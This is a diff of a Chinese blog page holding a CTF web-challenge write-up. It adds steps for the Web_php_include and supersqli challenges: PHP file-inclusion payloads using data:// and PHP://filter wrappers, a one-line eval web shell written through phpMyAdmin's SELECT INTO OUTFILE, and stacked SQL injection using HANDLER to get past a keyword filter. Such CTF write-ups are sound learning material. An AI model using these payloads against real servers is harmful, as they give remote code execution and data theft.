@@ -41,8 +41,13 @@
 <meta property="og:image" content="http://example.com/2023/04/05/web02/php_rce4.png">
 <meta property="og:image" content="http://example.com/2023/04/05/web02/Web_php_include1.png">
 <meta property="og:image" content="http://example.com/2023/04/05/web02/Web_php_include2.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/Web_php_include3.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/supersqli1.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/supersqli2.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/supersqli3.png">
+<meta property="og:image" content="http://example.com/2023/04/05/web02/supersqli4.png">
 <meta property="article:published_time" content="2023-04-05T07:30:17.000Z">
-<meta property="article:modified_time" content="2023-06-20T13:22:00.718Z">
+<meta property="article:modified_time" content="2023-06-28T13:05:20.527Z">
 <meta property="article:author" content="想有双手">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2023/04/05/web02/newscenter.png">
@@ -238,7 +243,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.3k 字
+          7.5k 字
         
       </span>
     
@@ -249,7 +254,7 @@
         
         
         
-          53 分钟
+          63 分钟
         
       </span>
     
@@ -454,7 +459,7 @@
 <h3 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h3><p>代码审计：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>乍一看很短，应该是挺简单的，但是转念一想，应该没这么简单</p>
+<p>乍一看很短，应该是挺简单的，但是转念一想，应该没这么简单，<del>毕竟字越少事越大</del></p>
 <p>搜了一下wp，给出的payload为</p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>];<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
 
@@ -467,12 +472,63 @@
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fl4gisisish3r3.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
 
 <p><img src="Web_php_include2.png" srcset="/img/loading.gif" lazyload alt="Web_php_include2"></p>
-<p>？怎么没有回显，找了很久的wp，发现，它在注释里，<del>小丑啊啊啊啊</del></p>
+<p>？怎么没有回显，找了很久，看wp发现，它在注释里，<del>小丑啊啊啊啊</del></p>
 <p>data:&#x2F;&#x2F;伪协议，是数据流封装器，和php:&#x2F;&#x2F;相似，都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过包含你输入的payload来实现目的。</p>
 <h4 id="另一种方法："><a href="#另一种方法：" class="headerlink" title="另一种方法："></a>另一种方法：</h4><p>由于strstr()这个函数对大小写敏感，所以我们可以换成PHP:&#x2F;&#x2F;的形式，pauload：</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>age=<span class="hljs-variable constant_">PHP</span><span class="hljs-symbol">://filter/convert</span>.base64-encode/resource=fl4gisisish3r3.php<br></code></pre></td></tr></table></figure>
 
 <p>也行</p>
+<h4 id="还有另一种方法："><a href="#还有另一种方法：" class="headerlink" title="还有另一种方法："></a>还有另一种方法：</h4><p>御剑扫后台，发现phpmyadmin，root，密码为空，登录</p>
+<p><img src="Web_php_include3.png" srcset="/img/loading.gif" lazyload alt="Web_php_include3"></p>
+<p>执行sql语句，看一下能不能写入一句话</p>
+<p>show variables like “secure_file_priv” ，值为空，可以写</p>
+<p>select “<?php @eval($_POST['cmd'])?>“ into outfile ‘.&#x2F;my.php’</p>
+<p>无法写入，改成</p>
+<p>select “<?php @eval($_POST['cmd'])?>“ into outfile ‘&#x2F;tmp&#x2F;my.php’</p>
+<p>写入成功后，蚁剑连一下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">60920</span><span class="hljs-regexp">/?page=/</span>tmp/my.php<br></code></pre></td></tr></table></figure>
+
+<p>也能成功读取</p>
+<hr>
+<h3 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h3><p>进去后有一句话：<strong>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</strong>和一个查询框，根据题目，应该是sql注入，单引号测试，报了sql语法错误，确认是sql注入</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p>页面回显提示：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">return preg_match(&quot;/<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span><br></code></pre></td></tr></table></figure>
+
+<p>被匹配到了</p>
+<p>直接用sqlmap了：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u url <span class="hljs-comment">--dbs</span><br></code></pre></td></tr></table></figure>
+
+<p>给出了supersqli这一个库，但是到了爆表名的时候就进行不下去了，看了一下wp，发现F12有</p>
+<p><img src="supersqli1.png" srcset="/img/loading.gif" lazyload alt="supersqli1"></p>
+<p><strong>sqlmap是没有灵魂的</strong></p>
+<p>实在让人汗颜</p>
+<p>手注：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; orde <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>出错，说明只有两列</p>
+<p>并且由上文得知，select关键字被替换了，不能用，并且&#x2F;i表示不区分大小写，这意味着大小写绕过是行不通的，想到堆叠注入：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="supersqli2.png" srcset="/img/loading.gif" lazyload alt="supersqli2"></p>
+<p><del>找到了“ctftraining”这个库，就是你了！</del></p>
+<p>根据题目提示，应该用supersqli这个库：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;;<span class="hljs-keyword">use</span> supersqli;<span class="hljs-keyword">show</span> tables;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="supersqli3.png" srcset="/img/loading.gif" lazyload alt="supersqli3"></p>
+<p>两个表，看看数字的表：</p>
+<p><strong>注：当纯数字作为表名时，需要加反引号</strong></p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span>&#x27;;<span class="hljs-keyword">use</span> supersqli;<span class="hljs-keyword">show</span> columns from `<span class="hljs-number">1919810931114514</span>`<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="supersqli4.png" srcset="/img/loading.gif" lazyload alt="supersqli4"></p>
+<p>有flag字段，但是select被ban了，网上看到了handler方法:</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27;;use supersqli;handler `<span class="hljs-number">1919810931114514</span>` open <span class="hljs-keyword">as</span> p;handler p <span class="hljs-built_in">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="handler简介"><a href="#handler简介" class="headerlink" title="handler简介"></a>handler简介</h4><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。 </p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jesseyoung/article/details/40785137">详见</a></p>
+<hr>
 
                 
               </div>
